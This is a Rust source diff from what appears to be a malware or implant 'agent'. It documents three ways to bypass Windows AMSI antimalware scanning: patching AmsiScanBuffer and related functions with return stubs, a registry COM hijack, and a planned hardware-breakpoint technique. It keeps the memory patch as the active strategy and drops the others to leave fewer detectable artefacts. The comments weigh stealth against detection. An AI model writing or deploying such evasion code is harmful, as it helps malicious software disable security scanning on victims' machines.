@@ -2,16 +2,36 @@
 #[cfg(windows)]
 use std::ptr;
 
+/// Apply a single AMSI bypass strategy: in-process memory patching of
+/// `AmsiScanBuffer`, `AmsiScanString`, and `AmsiInitialize`.
+///
+/// # Strategy selection
+///
+/// Three bypass strategies exist in this module:
+///
+/// 1. **Memory patch** (`apply_memory_patch` + `set_init_failed_flag`): patch
+///    the target functions with short-circuit stubs (`xor eax,eax; ret` or
+///    `mov eax, E_FAIL; ret`).  Volatile — survives only while the process runs.
+///    No persistent artefact. ← **active**
+///
+/// 2. **COM hijack** (`apply_com_hijack`): write an HKCU registry key that
+///    redirects AMSI's COM server to a nonexistent DLL so `AmsiInitialize`
+///    fails.  Persistent — leaves a detectable IOC in the registry after
+///    the agent exits.  Not applied here; registry artefacts are higher-risk
+///    than in-process patches.
+///
+/// 3. **HWBP/VEH**: hardware-breakpoint + vectored-exception-handler bypass.
+///    Stealthier than memory patching (no .text modification) but requires
+///    a per-thread setup and interaction with the VEH chain.  Planned for a
+///    future release.
+///
+/// Applying multiple strategies simultaneously increases the attack surface
+/// and leaves more detectable artefacts. This function applies strategy 1 only.
 #[cfg(windows)]
 pub fn orchestrate_layers() -> bool {
+    // Single strategy: volatile in-process memory patch.
     apply_memory_patch();
-    apply_com_hijack();
     set_init_failed_flag();
-
-    if !verify_bypass() {
-        // Second attempt if first pass did not take effect
-        apply_memory_patch();
-    }
     true
 }
 
